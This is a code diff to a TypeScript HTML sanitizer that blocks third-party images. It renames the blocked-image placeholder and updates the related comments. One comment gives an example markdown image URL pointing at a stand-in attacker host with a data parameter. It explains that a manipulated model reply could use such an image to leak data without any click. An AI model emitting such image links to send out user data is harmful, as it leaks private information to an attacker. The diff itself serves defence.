@@ -635,7 +635,7 @@ export interface RehypeStripUnsafeOptions {
    * `isAppOriginUrl`): a third-party `src` / `srcset` / `poster`, every CSS
    * declaration and SVG attribute that can load a resource are dropped. A
    * third-party `img[src]` moves to `data-blocked-src`, where the `img`
-   * renderer draws a click-to-load stand-in (`ExternalMediaGate`). Untrusted content
+   * renderer draws a notice in its place (`ExternalMediaNotice`). Untrusted content
    * must keep it off: an image URL is a request its author receives, and
    * `![](https://attacker.example/?d=…)` in a model reply carries whatever the
    * reply was made to put there, with no click.
@@ -747,7 +747,7 @@ function scrubProperties(properties: Properties, tag: string, media: MediaOrigin
   }
 
   if (media) {
-    // The stand-in reads `data-blocked-src`; content must not write one of its own.
+    // The notice reads `data-blocked-src`; content must not write one of its own.
     if ('dataBlockedSrc' in properties) {
       next ??= { ...properties };
       delete next.dataBlockedSrc;
@@ -785,8 +785,8 @@ function scrubElement(node: Element, media: MediaOrigins): Element | undefined {
 
 /**
  * A third-party image inside a link (`[![alt](src)](href)`) becomes the link's
- * text: its stand-in is a button, and a button inside a link is a control
- * inside a control. The reader still has the link; the image never loads.
+ * text: a blocked-image notice inside a link would turn the notice itself into
+ * the thing to click. The reader still has the link; the image never loads.
  */
 function blockedImagesAsText(children: ElementContent[]): ElementContent[] {
   if (!children.some(c => c.type === 'element' && c.tagName === 'img' && c.properties.dataBlockedSrc)) return children;
